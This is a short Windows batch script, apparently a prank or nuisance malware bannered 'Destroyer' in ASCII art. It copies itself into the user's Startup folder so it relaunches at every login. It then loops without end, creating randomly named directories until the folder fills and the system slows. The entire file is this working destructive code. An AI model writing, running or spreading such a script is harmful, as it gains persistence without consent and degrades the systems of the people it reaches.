@echo off
set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "TARGET=%STARTUP%\%~nx0"

if /I not "%~f0"=="%TARGET%" (
    copy /Y "%~f0" "%TARGET%" >nul
    echo Added to Windows Startup.
)
color 0A
echo     ___          _                             
echo    /   \___  ___| |_ _ __ ___  _   _  ___ _ __ 
echo   / /\ / _ \/ __| __| '__/ _ \| | | |/ _ \ '__|
echo  / /_//  __/\__ \ |_| | | (_) | |_| |  __/ |   
echo /___,' \___||___/\__|_|  \___/ \__, |\___|_|   
echo                                |___/           
:main
mkdir %random%%random%%random%%random%%random%%random%%random%
goto main
